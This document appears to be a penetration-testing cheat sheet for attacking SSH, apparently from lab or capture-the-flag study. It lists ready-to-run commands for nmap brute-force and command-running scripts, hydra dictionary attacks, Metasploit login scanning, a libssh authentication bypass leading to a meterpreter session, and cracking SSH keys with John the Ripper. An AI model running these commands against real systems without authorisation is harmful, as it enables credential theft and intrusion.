# Table of Contents
1. [Overview](#Overview)
	1. Ports
	3. Usage
	4. Related Services
2. [Tools](#Tools)
	1. netcat
	2. [nmap](#nmap)
	3. [hydra](#hydra)
	4. [msfconsole](#msfconsole)
	5. ssh2john

---

# Overview
SSH - Secure Shell

Used to connect to securely connect to remote machines.

## #Ports
- 22 : main port

## Related Services
- OpenSSH

## Usage
`ssh -p 22 user@192.168.4.3`

[Tool page](../Tools/SSH.md)

---

# #Tools
## netcat
`nc 192.168.13.3 22` 
- grabs banner

---

## #nmap
- --script
	- ssh2-enum-algos
		- shows key algorithms
	- ssh-hostkey 
		- --script-args ssh_hostkey=full
	- ssh-auth-methods
		- can check if user has no password set
		- --script-args="ssh.user=admin"
	- ssh-brute --script-args userdb=/userlist
		- args : userdb, passdb, timeout
		- has its own wordlist
	- ssh-run 
		- `--script-args"username=student,password="",cmd=ls"`

---

## #hydra
dictionary attack
`hydra -l student -P /usr/share/wordlist/rockyou.txt 192.168.7.3 ssh`

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.7.3 -t 4 ssh 
```

---

## #msfconsole
- use auxiliary/scanner/ssh/ssh_login
	- options
	- set rhosts 192.26.34.2
	- set userpass_file /usr/share/wordlists/metaslpoit/root_userpass.txt
	- set STOP_ON_SUCCESS true
	- set verbose true
	- run

### Example
1. `search libssh` : service "protocol 2.0"  module
2. `use auxiliary/scanner/ssh/libssh_auth_bypass`
	1. `set rhosts` : set target
	2. `set SPAWN_PTY true` : set flag to spawn session
	3. ctrl-z : background session
3. `sessions -u 1` : upgrade to meterpreter

### Userful Modules
- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

---

## ssh2john
1. `ssh2john > hash`
2. `john -w wordlist/rockyou.txt hash`
